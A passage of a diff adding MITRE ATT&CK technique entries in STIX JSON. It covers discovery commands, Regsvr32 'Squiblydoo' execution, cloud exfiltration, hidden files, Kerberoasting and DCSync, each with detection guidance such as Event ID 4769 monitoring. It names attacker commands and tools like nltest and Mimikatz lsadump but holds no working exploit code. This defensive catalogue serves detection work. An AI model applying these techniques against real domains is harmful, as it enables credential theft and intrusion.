+                    "url": "https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships"
+                },
+                {
+                    "source_name": "Harmj0y Domain Trusts",
+                    "description": "Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.",
+                    "url": "https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "2.1.0",
+            "x_mitre_contributors": [
+                "Dave Westgard",
+                "Elia Florio, Microsoft",
+                "Mnemonic",
+                "RedHuntLabs, @redhuntlabs",
+                "ExtraHop"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Script: Script Execution",
+                "Network Traffic: Network Traffic Content",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_version": "1.2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2017-05-31T21:30:48.728Z",
+            "modified": "2024-04-16T12:43:55.369Z",
+            "name": "Process Discovery",
+            "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1057",
+                    "external_id": "T1057"
+                },
+                {
+                    "source_name": "show_processes_cisco_cmd",
+                    "description": "Cisco. (2022, August 16). show processes - . Retrieved July 13, 2022.",
+                    "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_monitor_permit_list_through_show_process_memory.html#wp3599497760"
+                },
+                {
+                    "source_name": "US-CERT-TA18-106A",
+                    "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
+                    "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Austin Clark, @c2defense"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Process: OS API Execution",
+                "Command: Command Execution"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor for `show` commands being run by non-standard users from non-standard locations.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Network"
+            ],
+            "x_mitre_version": "1.5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-01-23T19:52:17.414Z",
+            "modified": "2023-04-21T12:24:56.148Z",
+            "name": "Regsvr32",
+            "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1218/010",
+                    "external_id": "T1218.010"
+                },
+                {
+                    "source_name": "FireEye Regsvr32 Targeting Mongolian Gov",
+                    "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html"
+                },
+                {
+                    "source_name": "LOLBAS Regsvr32",
+                    "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
+                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+                },
+                {
+                    "source_name": "Microsoft Regsvr32",
+                    "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
+                    "url": "https://support.microsoft.com/en-us/kb/249873"
+                },
+                {
+                    "source_name": "Carbon Black Squiblydoo Apr 2016",
+                    "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: \u201cSquiblydoo\u201d Continues Trend of Attackers Using Native OS Tools to \u201cLive off the Land\u201d. Retrieved April 9, 2018.",
+                    "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.1.0",
+            "x_mitre_contributors": [
+                "Casey Smith"
+            ],
+            "x_mitre_data_sources": [
+                "Module: Module Load",
+                "Command: Command Execution",
+                "Network Traffic: Network Connection Creation",
+                "Process: Process Creation"
+            ],
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Anti-virus",
+                "Application control"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_version": "2.1"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-03-09T15:04:32.767Z",
+            "modified": "2023-09-15T19:11:47.547Z",
+            "name": "Exfiltration to Cloud Storage",
+            "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "exfiltration"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1567/002",
+                    "external_id": "T1567.002"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.1.0",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Flow",
+                "File: File Access",
+                "Command: Command Execution"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_version": "1.2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2017-05-31T21:30:28.187Z",
+            "modified": "2023-08-14T19:08:59.741Z",
+            "name": "Remote System Discovery",
+            "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1018",
+                    "external_id": "T1018"
+                },
+                {
+                    "source_name": "CISA AR21-126A FIVEHANDS May 2021",
+                    "description": "CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware. Retrieved June 7, 2021.",
+                    "url": "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a"
+                },
+                {
+                    "source_name": "Elastic - Koadiac Detection with EQL",
+                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
+                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql"
+                },
+                {
+                    "source_name": "US-CERT-TA18-106A",
+                    "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
+                    "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.1.0",
+            "x_mitre_contributors": [
+                "Daniel Stepanic, Elastic",
+                "RedHuntLabs, @redhuntlabs",
+                "Austin Clark, @c2defense"
+            ],
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "File: File Access",
+                "Network Traffic: Network Connection Creation",
+                "Process: Process Creation"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Network"
+            ],
+            "x_mitre_version": "3.5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-02-26T17:46:13.128Z",
+            "modified": "2020-03-29T22:32:25.985Z",
+            "name": "Hidden Files and Directories",
+            "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1564/001",
+                    "external_id": "T1564.001"
+                },
+                {
+                    "source_name": "Sofacy Komplex Trojan",
+                    "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
+                    "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/"
+                },
+                {
+                    "source_name": "Antiquated Mac Malware",
+                    "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
+                    "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"
+                },
+                {
+                    "source_name": "WireLurker",
+                    "description": "Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.",
+                    "url": "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation",
+                "File: File Metadata",
+                "Command: Command Execution"
+            ],
+            "x_mitre_defense_bypassed": [
+                "Host forensic analysis"
+            ],
+            "x_mitre_detection": "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows",
+                "macOS",
+                "Linux"
+            ],
+            "x_mitre_version": "1.0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-02-11T18:43:38.588Z",
+            "modified": "2024-09-23T22:20:10.994Z",
+            "name": "Kerberoasting",
+            "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "credential-access"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1558/003",
+                    "external_id": "T1558.003"
+                },
+                {
+                    "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
+                    "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
+                    "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/"
+                },
+                {
+                    "source_name": "Empire InvokeKerberoast Oct 2016",
+                    "description": "EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.",
+                    "url": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1"
+                },
+                {
+                    "source_name": "SANS Attacking Kerberos Nov 2014",
+                    "description": "Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.",
+                    "url": "https://redsiege.com/kerberoast-slides"
+                },
+                {
+                    "source_name": "AdSecurity Cracking Kerberos Dec 2015",
+                    "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast \u2013 Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
+                    "url": "https://adsecurity.org/?p=2293"
+                },
+                {
+                    "source_name": "Microsoft SetSPN",
+                    "description": "Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.",
+                    "url": "https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx"
+                },
+                {
+                    "source_name": "Microsoft SPN",
+                    "description": "Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.",
+                    "url": "https://msdn.microsoft.com/library/ms677949.aspx"
+                },
+                {
+                    "source_name": "Harmj0y Kerberoast Nov 2016",
+                    "description": "Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved September 23, 2024.",
+                    "url": "https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Praetorian"
+            ],
+            "x_mitre_data_sources": [
+                "Active Directory: Active Directory Credential Request"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_system_requirements": [
+                "Valid domain account or the ability to sniff traffic within a domain"
+            ],
+            "x_mitre_version": "1.2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-02-11T18:45:34.293Z",
+            "modified": "2024-10-15T15:54:08.312Z",
+            "name": "DCSync",
+            "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "credential-access"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1003/006",
+                    "external_id": "T1003.006"
+                },
+                {
+                    "source_name": "GitHub Mimikatz lsadump Module",
+                    "description": "Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.",
+                    "url": "https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump"
+                },
+                {
+                    "source_name": "ADSecurity Mimikatz DCSync",
+                    "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.",
+                    "url": "https://adsecurity.org/?p=1729"
+                },
+                {
+                    "source_name": "AdSecurity DCSync Sept 2015",
+                    "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.",
+                    "url": "https://adsecurity.org/?p=1729"
+                },
+                {
+                    "source_name": "Microsoft DRSR Dec 2017",
+                    "description": "Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.",
+                    "url": "https://msdn.microsoft.com/library/cc228086.aspx"
+                },
+                {
+                    "source_name": "Microsoft NRPC Dec 2017",
+                    "description": "Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.",
+                    "url": "https://msdn.microsoft.com/library/cc237008.aspx"
+                },
+                {
+                    "source_name": "Microsoft GetNCCChanges",
+                    "description": "Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.",
+                    "url": "https://msdn.microsoft.com/library/dd207691.aspx"
+                },
+                {
+                    "source_name": "Microsoft SAMR",
+                    "description": "Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.",
+                    "url": "https://msdn.microsoft.com/library/cc245496.aspx"
+                },
+                {
+                    "source_name": "Samba DRSUAPI",
+                    "description": "SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.",
+                    "url": "https://wiki.samba.org/index.php/DRSUAPI"
+                },
+                {
+                    "source_name": "Harmj0y DCSync Sept 2015",
+                    "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.",
+                    "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"
+                },
+                {
+                    "source_name": "Harmj0y Mimikatz and DCSync",
+                    "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved September 23, 2024.",
+                    "url": "https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"
+                },
+                {
+                    "source_name": "InsiderThreat ChangeNTLM July 2017",
+                    "description": "Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.",
+                    "url": "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM"
+                },
+                {
+                    "source_name": "Wine API samlib.dll",
+                    "description": "Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.",
+                    "url": "https://source.winehq.org/WineAPI/samlib.html"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "ExtraHop",
+                "Vincent Le Toux"
+            ],
+            "x_mitre_data_sources": [
